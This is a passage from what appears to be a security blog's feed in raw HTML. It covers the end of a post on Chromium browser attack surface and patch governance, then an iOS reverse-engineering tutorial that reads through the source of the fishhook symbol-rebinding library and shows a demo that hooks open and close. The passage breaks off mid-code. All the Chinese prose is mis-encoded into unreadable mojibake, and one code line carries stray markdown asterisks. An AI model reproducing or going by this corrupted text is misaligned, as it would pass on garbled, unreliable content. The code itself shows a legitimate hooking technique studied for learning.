title="ä½œä¸ºé˜²å®ˆæ–¹"></a>ä½œä¸ºé˜²å®ˆæ–¹</h4><ul><li>å®‰å…¨å¼€å‘æ„è¯†æé«˜ï¼Œä¸è¦ä¸ºäº†æ–¹ä¾¿ä¹±ç”¨å‚æ•°</li><li>åŠæ—¶æ›´æ–°ç‰ˆæœ¬oræ‰“è¡¥ä¸</li></ul><p><del>æ‰¯è¿œä¸€äº›ï¼Œæœ‰äº›æ‰«æå™¨ç”¨chromeï¼Œå¯ä»¥ä½¿ç”¨è¿™æ‰‹æ®µåšååˆ¶ï¼Œä½ æ•¢çˆ¬æˆ‘è½»åˆ™crashé‡åˆ™rceã€‚</del></p><h4 id="ä½œä¸ºæ”»å‡»æ–¹-1"><a href="#ä½œä¸ºæ”»å‡»æ–¹-1" class="headerlink" title="ä½œä¸ºæ”»å‡»æ–¹"></a>ä½œä¸ºæ”»å‡»æ–¹</h4><ul><li>ç‰ˆæœ¬æ¢æµ‹æ¯”è¾ƒé‡è¦ï¼Œåšè¿™ä¸ªæ“ä½œå‰å…ˆæƒ³æƒ³é“¶æ‰‹é•¯</li><li>ä»€ä¹ˆï¼Ÿä½ è¿˜æƒ³expï¼Ÿæˆ‘çœ‹ä½ æƒ³æˆ´ä¸Šé“¶æ‰‹é•¯</li></ul><h2 id="ä¸ºäº†é£é™©æ²»ç†åšäº†ä»€ä¹ˆ"><a href="#ä¸ºäº†é£é™©æ²»ç†åšäº†ä»€ä¹ˆ" class="headerlink" title="ä¸ºäº†é£é™©æ²»ç†åšäº†ä»€ä¹ˆ"></a>ä¸ºäº†é£é™©æ²»ç†åšäº†ä»€ä¹ˆ</h2><blockquote><p>è¯´åˆ°è¿™ä¸ªå°±æƒ³åˆ°äº†2020.11.13 é‚£ä¸ªä¸‹åˆå¼¹å‡ºè®¡ç®—å™¨çš„æ—¶å€™</p></blockquote><p>  ä¸»è¦æ˜¯ä¸‰å—å§ï¼Œæˆ‘å‘ç°ç”²æ–¹é‡Œæ¶®ä¸€åœˆä¹‹åæ€ç»´ç¡®å®ä¸å¤ªä¸€æ ·äº†ã€‚</p><ul><li><p>é¦–å…ˆè¦è®²æ˜ç™½é£é™©ï¼Œè¿™é‡Œä¹ŸåŒ…å«è¯æ˜é£é™©ï¼Œéœ€è¦å¼ºæœ‰åŠ›çš„è¯æ˜ï¼Œæ¯”å¦‚expæ‰“ç©¿è¿™æ ·ï¼Œç ”å‘å¯èƒ½ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆè¿™æ ·å¯ä»¥RCEï¼Œè¿™å°±éœ€è¦æ²Ÿé€šå¥½è®©å¤§å®¶æœ‰ç›¸åŒçš„sense</p></li><li><p>å…¶æ¬¡æ˜¯ä¿®å¤æ–¹æ¡ˆï¼Œä¸åŒä¸šåŠ¡çº¿ã€åœºæ™¯ä¸ä¸€æ ·ï¼Œè¿™ä¸ªå¾—å’Œä¸šåŠ¡èŠæ˜ç™½äº†æ‰å¥½ç»™æ–¹æ¡ˆï¼Œä¸ç„¶å°±æ˜¯â€œç©ºä¸­æ¥¼é˜â€ï¼Œè¿™å—å°±ç®—æ˜¯æ²»ç†å­˜é‡é—®é¢˜äº†</p><ul><li>æ²™ç®±å¼€ä¸å¼€</li><li>è¡¥ä¸æ— æ³•è‡ªåŠ¨åˆå…¥ï¼Œæ€ä¹ˆå¤„ç†æ›´é«˜æ•ˆï¼Œèƒ½ä¸èƒ½è‡ªåŠ¨åŒ–èŠ‚çœæ’æœŸ</li><li>ä»¥åæ€ä¹ˆåŠï¼Œå»ºç«‹ä¸ªä»€ä¹ˆæµç¨‹è·‘è¿™ä¸ªäº‹æƒ…</li></ul></li><li><p>æœ€åå¯ä»¥å¼€å‘ä¸€äº›å·¥å…·åšä¸€äº›é¢„è­¦å·¥ä½œï¼Œç›¸å½“äºæ²»ç†å¢é‡é—®é¢˜</p><ul><li><p>å­˜é‡æ€ä¹ˆæ‰«ï¼Œè¡¥ä¸æ€ä¹ˆæå–ï¼Œè¿™ä¸ªéƒ¨åˆ†å¾—å¥½å¥½è®¾è®¡æ„æ€</p></li><li><p>é¢„è­¦Botï¼Œè¿™ä¸ªæœ¬è´¨å°±æ˜¯ä¸ªçˆ¬è™«+æœºå™¨äººï¼Œä¹‹å‰ç ”ç©¶çš„æ—¶å€™è‡ªå·±æè¿‡ä¸€ä¸ªtg botä¸“é—¨å¹²è¿™ä¸ªï¼Œè¿˜èƒ½ææ¼æ´æŸ¥è¯¢ </p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824224612405.png" alt="image-20220824224612405" style="zoom:50%;" /></li></ul></li></ul><h2 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>  æˆ‘è®¤ä¸ºå¾ˆæœ‰æ„æ€çš„æ˜¯è¿™ä¸ªæ”»å‡»é¢å¯¹äºé˜²å®ˆæ–¹æ¥è¯´ç®€ç›´æ˜¯â€œæŠ˜ç£¨â€ï¼Œåªè¦ä½ çš„é¡¹ç›®ä½¿ç”¨chromiumï¼Œä½ å°±ä¸å¾—ä¸é¢ä¸´å„ç§è¡¥ä¸ã€å‡çº§ï¼Œè¿™å®é™…ä¸Šæ˜¯å¾ˆéš¾åšåˆ°åŠæ—¶è¡¥ä¸&amp;å‡çº§çš„ï¼Œæ‰€ä»¥ç†è®ºä¸Šå­˜åœ¨<code>patch gap</code>ï¼Œè¿™å°±å¯¼è‡´å¾ˆå¤šå¸å¼•çœ¼çƒçš„ <code>xxx RCE</code> ä¼ æ’­çš„éå¸¸å¹¿æ³›ã€‚æ—©åœ¨21å¹´7æœˆä»½ï¼Œè…¾è®¯çš„è“å†›åœ¨21å¹´å‘å¸ƒäº†<a href="https://cloud.tencent.com/developer/article/1848763">æ”»é˜²å¯ç¤ºï¼šChromiumç»„ä»¶é£é™©å‰–æä¸æ”¶æ•›</a>ï¼Œä¹Ÿè¯¦ç»†åœ°å‰–æäº†è¯¥æ”»å‡»é¢ä»¥åŠä¿®å¤æ–¹æ¡ˆï¼Œå¯¹äºæˆ‘è‡ªå·±æ¥è¯´æ¯”è¾ƒå¯æƒœçš„æ˜¯åœ¨å…¬å¸å†…éƒ¨æäº†è¿™å—æ”»å‡»é¢çš„æ²»ç†å·¥ä½œæ²¡æœ‰å‡ºå»è®²ä¸€è®²orå‘ä¸ªæ–‡ç« å•¥çš„ï¼Œåˆ°åé¢è¿™ç¯‡æ–‡ç« å‡ºæ¥åå·²ç»æ²¡ä»€ä¹ˆå¯è®²çš„äº† :( </p><p>  ä¸»è¦æƒ³å¯¹è‡ªå·±çš„ä¸€äº›å·¥ä½œåšä¸ªç®€å•çš„æ€»ç»“ï¼Œæ‰€ä»¥æ‰æœ‰äº†æœ¬æ–‡ï¼Œæ—¶è‡³2022.8ï¼Œè¿™ä¸ªæ”»å‡»é¢åº”è¯¥å·²ç»å˜å¾—ä¼—æ‰€å‘¨çŸ¥ï¼Œæ²¡æœ‰ä»€ä¹ˆç§˜å¯†å¯è¨€äº†ï¼Œæƒ³æ¥è¿™æ‰‹æ³•æˆ‘åœ¨17å¹´æŸé¡¹ç›®ä¸Šä¹Ÿè§è¿‡ï¼Œä¸è¿‡å½“æ—¶æ˜¯webkitã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;  è¿‡å»çš„è¿‘ä¸€å¹´çš„æ—¶é—´(æœ¬æ–‡åœ¨21å¹´å¼€çš„å¤´ï¼ŒæœŸé—´ä¸€ç›´æ˜¯hiddençŠ¶æ€)ï¼Œæˆ‘æ¥è§¦äº†&lt;del&gt;ä¸‡æ¶çš„&lt;/del&gt;æµè§ˆå™¨å®‰å…¨ï¼Œä¸è¿‡åªæ˜¯ä¸€ä¸ªè„šæœ¬å°å­çš„æ°´å¹³ :(  &lt;/p&gt;</summary>
    
    
    
    
    <category term="Chrome" scheme="https://o0xmuhe.github.io/tags/Chrome/"/>
    
    <category term="Exploit" scheme="https://o0xmuhe.github.io/tags/Exploit/"/>
    
  </entry>
  
  <entry>
    <title>iOS RE 4 beginners 3 - fishhook</title>
    <link href="https://o0xmuhe.github.io/2021/07/24/iOS-RE-4-beginners-3-fishhook/"/>
    <id>https://o0xmuhe.github.io/2021/07/24/iOS-RE-4-beginners-3-fishhook/</id>
    <published>2021-07-23T16:05:49.000Z</published>
    <updated>2021-07-23T16:19:26.859Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å…³äº"><a href="#å…³äº" class="headerlink" title="å…³äº"></a>å…³äº</h1><p>Fishhookæ˜¯Facebookæä¾›çš„åˆ©ç”¨MachOæ–‡ä»¶æƒ°æ€§åŠ è½½åŸç†ï¼Œé€šè¿‡ä¿®æ”¹æ‡’åŠ è½½å’Œéæ‡’åŠ è½½ä¸¤ä¸ªè¡¨çš„æŒ‡é’ˆè¾¾åˆ°Cå‡½æ•°HOOKçš„ç›®çš„ä¸€ä¸ªè½»é‡çº§çš„hookåº“ã€‚ç†è§£è¿™ä¸ªå·¥å…·å’Œç†Ÿæ‚‰æµç¨‹ä¹Ÿæ˜¯å¯ä»¥å¸®åŠ©æ›´å¥½çš„ç†è§£MachOæ–‡ä»¶æ ¼å¼ :)</p><span id="more"></span><p>åŸç†å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fishhook.png" alt="fishhook"></p><h1 id="æºç é˜…è¯»"><a href="#æºç é˜…è¯»" class="headerlink" title="æºç é˜…è¯»"></a>æºç é˜…è¯»</h1><p>æ ¸å¿ƒå…¶å®å°±æ˜¯rebind_symbols è¿™ä¸ªæ¥å£ï¼Œå¦ä¸€ä¸ª <code>rebind_symbols_image</code> æ˜¯æŒ‡å®šmachoä¸­çš„symbolè¿›è¡Œrebindï¼Œæ‰€ä»¥ä» <code>rebind_symbols</code>å‡½æ•°çœ‹èµ·å°±è¡Œäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FISHHOOK_VISIBILITY</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(struct rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel)</span></span>;</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸‹å…³é”®çš„è°ƒç”¨è·¯å¾„:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rebind_symbols(struct rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel);</span><br><span class="line">        _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));</span><br><span class="line">            rebind_symbols_for_image(_rebindings_head, header, slide);</span><br><span class="line">                perform_rebinding_with_section(...)</span><br></pre></td></tr></table></figure><p><code>_rebindings_head</code> æŒ‡å‘ä¸€ä¸ªéœ€è¦é‡ç»‘å®šçš„ç¬¦å·çš„å•é¡¹é“¾è¡¨:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rebinding</span> &#123;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">  <span class="keyword">void</span> *replacement;</span><br><span class="line">  <span class="keyword">void</span> **replaced;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rebinding</span> *<span class="title">rebindings</span>;</span></span><br><span class="line">  <span class="keyword">size_t</span> rebindings_nel;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *_<span class="title">rebindings_head</span>;</span></span><br><span class="line"><span class="keyword">segment_command_t</span> *cur_seg_cmd;</span><br><span class="line">  <span class="keyword">segment_command_t</span> *linkedit_segment = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symtab_command</span>* <span class="title">symtab_cmd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dysymtab_command</span>* <span class="title">dysymtab_cmd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>); <span class="comment">// now, cur points to LOAD_CMDs</span></span><br><span class="line">  <span class="comment">// iter LOAD CMDs</span></span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="comment">// find LINK_EDIT seg</span></span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == <span class="number">0</span>) &#123;</span><br><span class="line">        linkedit_segment = cur_seg_cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123;</span><br><span class="line">      <span class="comment">// find SYMTAB CMD</span></span><br><span class="line">      symtab_cmd = (struct symtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123;</span><br><span class="line">      <span class="comment">// find DYSYM CMD</span></span><br><span class="line">      dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">      !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get indirect symbol table (array of uint32_t indices into symbol table)</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symtab = (<span class="keyword">uint32_t</span> *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);</span><br><span class="line"></span><br><span class="line">  cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">          <span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123;</span><br><span class="line">        <span class="keyword">section_t</span> *sect =</span><br><span class="line">          (<span class="keyword">section_t</span> *)(cur + <span class="keyword">sizeof</span>(<span class="keyword">segment_command_t</span>)) + j;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_rebinding_with_section</span><span class="params">(struct rebindings_entry *rebindings,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">section_t</span> *section,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">intptr_t</span> slide,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">nlist_t</span> *symtab,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">char</span> *strtab,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">uint32_t</span> *indirect_symtab)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// if _DATA,CONST</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">bool</span> isDataConst = <span class="built_in">strcmp</span>(section-&gt;segname, SEG_DATA_CONST) == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//__la_symbol_ptrçš„reserved1å­—æ®µæ ‡è¯†äº†sectionæè¿°çš„ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­å¼€å§‹çš„index</span></span><br><span class="line">  <span class="comment">//åŠ¨æ€ç¬¦å·è¡¨ä¸­ç¬¬ä¸€ä¸ªéœ€è¦è§£æçš„ç¬¦å· å¼€å§‹åœ°å€</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1;</span><br><span class="line">  <span class="comment">// section __la_symbol_ptr</span></span><br><span class="line">  <span class="keyword">void</span> **indirect_symbol_bindings = (<span class="keyword">void</span> **)((<span class="keyword">uintptr_t</span>)slide + section-&gt;addr);</span><br><span class="line">  <span class="keyword">vm_prot_t</span> oldProtection = VM_PROT_READ;</span><br><span class="line">  <span class="comment">// chang memory protection to write &amp;&amp; back old memery protection</span></span><br><span class="line">  <span class="keyword">if</span> (isDataConst) &#123;</span><br><span class="line">    oldProtection = get_protection(rebindings);</span><br><span class="line">    mprotect(indirect_symbol_bindings, section-&gt;size, PROT_READ | PROT_WRITE);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Traverse section -&gt; symtab</span></span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; section-&gt;size / <span class="keyword">sizeof</span>(<span class="keyword">void</span> *); i++) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> symtab_index = indirect_symbol_indices[i];</span><br><span class="line">    <span class="keyword">if</span> (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||</span><br><span class="line">        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// nlist_t</span></span><br><span class="line">    <span class="keyword">uint32_t</span> strtab_offset = symtab[symtab_index].n_un.n_strx;</span><br><span class="line">    <span class="keyword">char</span> *symbol_name = strtab + strtab_offset;</span><br><span class="line">    <span class="keyword">bool</span> symbol_name_longer_than_1 = symbol_name[<span class="number">0</span>] &amp;&amp; symbol_name[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *<span class="title">cur</span> =</span> rebindings;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur-&gt;rebindings_nel; j++) &#123;</span><br><span class="line">        <span class="comment">// yes, it&#x27;s target symbol to rebind!</span></span><br><span class="line">        <span class="keyword">if</span> (symbol_name_longer_than_1 &amp;&amp;</span><br><span class="line">            <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">              indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">            *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i]; <span class="comment">// backup old func </span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// do rebind, hook!</span></span><br><span class="line">          **indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;**</span><br><span class="line">          <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  symbol_loop:;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// restore protection</span></span><br><span class="line">  <span class="keyword">if</span> (isDataConst) &#123;</span><br><span class="line">    <span class="keyword">int</span> protection = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_READ) &#123;</span><br><span class="line">      protection |= PROT_READ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_WRITE) &#123;</span><br><span class="line">      protection |= PROT_WRITE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_EXECUTE) &#123;</span><br><span class="line">      protection |= PROT_EXEC;</span><br><span class="line">    &#125;</span><br><span class="line">    mprotect(indirect_symbol_bindings, section-&gt;size, protection);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h1><p>ç›´æ¥æ‹¿å®˜æ–¹çš„demoç¼–è¯‘å‡ºæ¥è°ƒè¯•åˆ†ææµç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/fishhook î‚° cat main.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fishhook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_close)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_open)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_close</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Calling real close(%d)\\n&quot;</span>, fd);</span><br><span class="line">  <span class="keyword">return</span> orig_close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> oflag, ...)</span> </span>&#123;</span><br><span class="line">  va_list ap = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">mode_t</span> mode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((oflag &amp; O_CREAT) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// mode only applies to O_CREAT</span></span><br><span class="line">    va_start(ap, oflag);</span><br><span class="line">    mode = va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling real open(&#x27;%s&#x27;, %d, %d)\\n&quot;</span>, path, oflag, mode);</span><br><span class="line">    <span class="keyword">return</span> orig_open(path, oflag, mode);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calling real open(&#x27;%s&#x27;, %d)\\n&quot;</span>, path, oflag);</span><br><span class="line">    <span class="keyword">return</span> orig_open(path, oflag, 